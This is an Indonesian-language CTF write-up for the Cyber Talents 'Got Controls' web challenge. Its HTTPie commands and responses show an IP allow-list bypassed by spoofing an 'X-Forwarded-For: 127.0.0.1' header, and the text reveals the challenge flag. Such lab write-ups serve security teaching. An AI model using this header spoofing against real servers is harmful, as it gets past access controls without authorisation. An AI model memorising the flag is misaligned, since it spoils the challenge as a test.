## [Writeup] Cyber Talents: Got Controls


Tutorial singkat kali ini akan membahas solusi untuk soal CTF [Cyber Talents: Got Controls](https://cybertalents.com/challenges/web/got-controls) yang termasuk ke dalam kategori web security. Berikut ini adalah petunjuk untuk soal tersebut:

```
We believe we made a good job protecting our infrastructure,
can you bypass our controls.
```

Kita dapat mengakses halaman untuk soal tersebut [pada tautan ini](http://35.197.254.240/gotcontrol/). Kita akan menggunakan [HTTPie](https://httpie.org) untuk mengerjakan soal tersebut. Pertama, kita akan mengakses halaman tersebut:

```bash
% http "http://35.197.254.240/gotcontrol/"
HTTP/1.1 200 OK
Allow: GET, POST, HEAD,OPTIONS
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Mon, 03 Aug 2020 00:52:40 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

Sorry, your IP is not allowed, this server is only accessible from local machine or local LAN.
```

Pesan error tersebut memberitahukan bahwa kita hanya dapat mengakses server tersebut menggunakan IP dari mesin tersebut atau IP local LAN. Untuk menyelesaikan soal ini, kita akan menambahkan header [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) pada request yang kita kirimkan. Berikut ini adalah caranya:

```bash
% http "http://35.197.254.240/gotcontrol/" "X-Forwarded-For: 127.0.0.1"
HTTP/1.1 200 OK
Allow: GET, POST, HEAD,OPTIONS
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Mon, 03 Aug 2020 00:56:06 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

You got me, here's the flag : FLAG{NEVER_TRUST_HEADERS}
```

Bisa terlihat, bahwa request tersebut berhasil, dan flagnya adalah `FLAG{NEVER_TRUST_HEADERS}`. Sekian tutorial singkat kali ini, semoga bermanfaat. Terima kasih kepada Allah SWT, dan Anda yang telah membaca tutorial ini.
